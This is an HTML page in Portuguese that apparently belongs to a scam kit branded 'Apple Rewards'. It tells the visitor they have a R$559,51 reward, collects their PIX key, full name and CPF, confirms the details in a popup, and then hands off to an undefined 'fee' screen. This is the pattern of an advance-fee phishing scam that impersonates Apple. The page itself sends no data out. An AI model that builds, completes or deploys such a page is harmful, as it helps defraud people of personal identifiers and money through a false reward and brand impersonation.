<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Apple Rewards</title>

<style>
/* ======= ESTILOS ORIGINAIS (INTACTOS) ======= */
body{background:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;margin:0;padding:0;display:flex;justify-content:center;align-items:flex-start;min-height:100vh}
.shine{animation:shine .6s ease-out}
@keyframes shine{0%{text-shadow:0 0 0 gold}50%{text-shadow:0 0 14px gold}100%{text-shadow:0 0 0 gold}}
.container,.resgate-container,.taxa-container,.envio-container{width:95%;max-width:420px;background:#fff;margin-top:25px;border-radius:22px;padding:25px;box-shadow:0 8px 22px rgba(0,0,0,.08)}
.progress-wrapper{width:100%;height:10px;background:#d9d9d9;border-radius:20px;overflow:hidden;margin-bottom:20px}
.progress-bar{height:100%;width:0;background:#0071e3;transition:.35s}
.option{background:#fafafa;padding:14px;border-radius:14px;border:1px solid #e5e5e5;margin-bottom:12px;cursor:pointer}
button{width:100%;background:#000;color:#fff;padding:14px;border:none;border-radius:14px;font-size:15px;font-weight:700;margin-top:18px;cursor:pointer;opacity:.7}
button.enabled{opacity:1}
.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.55);display:none;justify-content:center;align-items:center;z-index:9999}
.popup-box{background:#fff;width:90%;max-width:380px;border-radius:20px;padding:25px;text-align:center}
.popup-box h3{font-size:20px;font-weight:700;margin-bottom:10px}
.popup-btn{background:#000;color:#fff;border:none;width:100%;padding:14px;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer}
.popup-confirm .dados{text-align:left;font-size:14px;margin:12px 0}
.popup-confirm .dados div{margin-bottom:6px}
.valor-final{font-size:34px;font-weight:900;color:#00c851;margin:12px 0}
.resgate-container,.taxa-container,.envio-container{display:none}
select,input{width:100%;padding:12px;border-radius:12px;border:1px solid #ccc;margin-bottom:18px;font-size:15px}
#btnSaque{background:#0071e3;font-size:16px}

/* ======= NOVO: POPUP CONFIRMAÇÃO PIX ======= */
</style>
</head>

<body>

<!-- ======= RESGATE ======= -->
<div class="resgate-container" id="resgateContainer">

<h2>Resgatar Recompensa</h2>
<div class="saldo-box">Saldo disponível: R$559,51</div>

<select id="tipoChave">
<option value="">Selecione o tipo de chave</option>
<option>Chave Aleatória</option>
<option>Celular</option>
<option>E-mail</option>
<option>CPF</option>
</select>

<input type="text" id="chavePix" placeholder="Digite sua chave PIX">
<input type="text" id="nomePix" placeholder="Digite seu nome completo">
<input type="text" id="cpfPix" placeholder="Digite seu CPF (somente números)" inputmode="numeric">

<button id="btnSaque">REALIZAR SAQUE AGORA</button>
</div>

<!-- ======= POPUP CONFIRMAÇÃO PIX ======= -->
<div class="popup popup-confirm" id="popupConfirm">
<div class="popup-box">
<h3>Confirme seus dados</h3>
<div class="dados">
<div><strong>Tipo:</strong> <span id="confTipo"></span></div>
<div><strong>Chave:</strong> <span id="confChave"></span></div>
<div><strong>Nome:</strong> <span id="confNome"></span></div>
<div><strong>CPF:</strong> <span id="confCpf"></span></div>
</div>
<div class="valor-final">R$559,51</div>
<button class="popup-btn" id="btnConfirmarPix">SIM, RECEBER AGORA</button>
<button class="popup-btn" style="background:#ccc;color:#000;margin-top:8px" onclick="popupConfirm.style.display='none'">NÃO</button>
</div>
</div>

<script>
/* ======= LÓGICA ORIGINAL MANTIDA + CONFIRMAÇÃO ======= */

const btnSaque = document.getElementById("btnSaque");
const popupConfirm = document.getElementById("popupConfirm");
const btnConfirmarPix = document.getElementById("btnConfirmarPix");

btnSaque.onclick = () => {
document.getElementById("confTipo").innerText = tipoChave.value;
document.getElementById("confChave").innerText = chavePix.value;
document.getElementById("confNome").innerText = nomePix.value;
document.getElementById("confCpf").innerText = cpfPix.value;
popupConfirm.style.display = "flex";
};

btnConfirmarPix.onclick = () => {
popupConfirm.style.display = "none";
resgateContainer.style.display = "none";
taxaContainer.style.display = "block";
};
</script>

</body></html>
